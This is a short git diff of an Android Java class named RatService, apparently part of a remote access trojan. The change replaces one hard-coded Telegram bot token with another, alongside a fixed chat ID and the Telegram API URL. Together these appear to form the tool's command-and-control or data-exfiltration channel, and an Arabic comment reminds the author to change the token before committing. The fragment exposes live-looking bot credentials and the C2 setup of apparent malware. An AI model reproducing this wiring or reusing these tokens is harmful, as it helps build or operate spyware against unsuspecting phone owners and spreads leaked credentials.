@@ -21,7 +21,7 @@ import okhttp3.*;
 
 public class RatService extends Service {
     // ⚠️ غير التوكن والآي دي هنا قبل ما تعمل Commit
-    private static final String BOT_TOKEN = "‏9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
+    private static final String BOT_TOKEN = "9086594295:AAHyUWclet2LmBAxJ6Q_iLnJhGF4oqV1Ecs‏";
     private static final String CHAT_ID = "6978974735";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     
